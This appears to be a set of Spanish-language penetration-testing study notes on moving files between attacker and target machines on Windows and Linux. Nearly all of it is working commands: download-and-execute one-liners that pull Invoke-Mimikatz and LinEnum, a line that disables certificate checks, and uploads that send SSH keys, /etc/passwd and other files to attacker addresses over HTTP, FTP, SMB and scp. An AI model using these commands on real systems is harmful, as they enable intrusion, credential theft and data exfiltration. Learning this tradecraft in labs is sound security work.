# Overview

En esta nota se describen métodos para transferir archivos entre máquinas.
# Windows

## [[80-http]] download

```pwsh
certutil -urlcache -f http://10.10.31.2/nc.exe nc.exe
```

## Base64

Codificando y decodificando en base64, podemos enviarnos un archivo:

```bash
cat id_rsa |base64 -w 0;echo
```
```powershell
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<HASH>"))
```

## PowerShell Web Downloads

| Método                 | Descripción                                                                                           |
|------------------------|-------------------------------------------------------------------------------------------------------|
| OpenRead               | Devuelve los datos de un recurso como un flujo (Stream).                                              |
| OpenReadAsync          | Devuelve los datos de un recurso sin bloquear el hilo que lo llama.                                   |
| DownloadData           | Descarga datos de un recurso y devuelve un arreglo de bytes (Byte array).                             |
| DownloadDataAsync      | Descarga datos de un recurso y devuelve un arreglo de bytes sin bloquear el hilo que lo llama.        |
| DownloadFile           | Descarga datos de un recurso a un archivo local.                                                      |
| DownloadFileAsync      | Descarga datos de un recurso a un archivo local sin bloquear el hilo que lo llama.                    |
| DownloadString         | Descarga una cadena (String) de un recurso y devuelve una cadena.                                     |
| DownloadStringAsync    | Descarga una cadena (String) de un recurso sin bloquear el hilo que lo llama.                         |

### Descargar un archivo
```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

```powershell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
> Funciona pero es más lento.
### Ejecutar directamente una cadena
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```
```powershell
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### Bypasear mensajes de error
En ocasiones,  ocurre que *Internet Explorer* no se ha configurado totalmente, lo que hace que salte un diálogo sobre el que no podremos hacer click. Para ello podemos utilizar `-UseBasicParsing`:

```powershell
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

Para aquellas en las que el error tiene que ver con el *certificado SSL*:

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## SMB Downloads

Podemos utilizar [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) de la [[impacket|suite de Impacket]] para montar un servidor [[445-SMB|SMB]]:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

```powershell
copy \\192.168.220.133\share\nc.exe
```

En caso de  que windows bloquee conexiones anónimas, simplemente debemos especificar un usuario:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```powershell
net use n: \\192.168.220.133\share /user:test test
```

## FTP Downloads

Igual que antes, podemos montar un servidor [[21-ftp|FTP]] con [[python]] y `pyftpdlib`:

```bash
sudo python3 -m pyftpdlib --port 21
```

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

En ocasiones, no tendremos una shell interactiva, por lo que podemos introducir los comandos en un archivo:

```powershell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

## PowerShell Web Uploads

Para las subidas, podemos configurarnos `uploadserver`, un módulo extendido de `HTTP.server` de [[python]]:

```bash
pip3 install uploadserver
```
```bash
python3 -m uploadserver
```

Y posteriormente, utilizar el script [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1):

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

### Base64
Otra forma de realizar una subida, es encodeando en *base64* y mandando la cadena con [[netcat]]:

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))

Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
```bash
nc -lvnp 8000
```
```bash
echo <base64> | base64 -d -w 0 > hosts
```

## SMB Uploads

Las empresas suelen permitir el tráfico saliente por [[80-http|HTTP]] y  [[443-https|HTTPS]], pero bloquean el protocolo [[445-SMB|SMB]] por seguridad. Una alternativa es usar SMB sobre HTTP con [[WebDAV]], una extensión de HTTP que permite a un servidor web funcionar como un servidor de archivos, incluso usando HTTPS.

Para montarnos nuestro WebDAV, debemos instalar dos módulos de [[python]], `wsgidav` y `cheroot`:

```bash
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

```powershell
dir \\192.168.49.128\DavWWWRoot
```

> `DavWWWRoot` es una palabra clave especial reconocida por el Shell de Windows. No corresponde a ninguna carpeta real en el servidor WebDAV; en cambio, le indica al controlador Mini-Redirector, que maneja las solicitudes WebDAV, que se está conectando a la raíz del servidor WebDAV.
>
> Para evitar usar `DavWWWRoot`, puedes especificar una carpeta existente en el servidor al conectarte, por ejemplo: `\192.168.49.128\sharefolder`.

```powershell
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```

## FTP Uploads

Igual que antes, utilizaremos el módulo `pyftpdlib` de [[python]], con la opción `--write`:

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

En caso de no tener una shell interactiva:

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

# Linux

## Base64

```bash
cat id_rsa |base64 -w 0;echo
```

```bash
echo -n 'LS0tLS1CRUd[...]tLS0tLQo=' | base64 -d > id_rsa
```

## Web Download

Si disponemos de un servicio web, podemos descargar archivos en nuestra máquina de atacante con [[wget]] ó [[curl]].

```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

## Fileless atacks

Haciendo uso de *pipes*, podemos prescindir de archivos:

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```
```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

## /dev/TCP

Con builtins de bash podemos transferir archivos, por ejemplo mediante `/dev/tcp`:

Primero establecemos una conexión:

```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

Tramitamos la petición:

```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

E imprimimos la respuesta:

```bash
cat <&3
```

## [[22-ssh|SSH]]

Mediante [[scp]], podemos transferir archivos:

```bash
scp plaintext@192.168.49.128:/root/myroot.txt .
```

Y para subirlos:

```bash
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

## Web Server Uploads

```bash
python2.7 -m SimpleHTTPServer
```
```bash
python3 -m http.server
```

```bash
php -S 0.0.0.0:8000
```

```bash
ruby -run -ehttpd . -p8000
```

# Mediante Código

## Python

Descargar:

```bash
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

Subir:

```bash
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

## PHP

```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
```bash
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

## Ruby

```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

## Perl

```bash
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

## Javascript

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

## Visual Basic

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```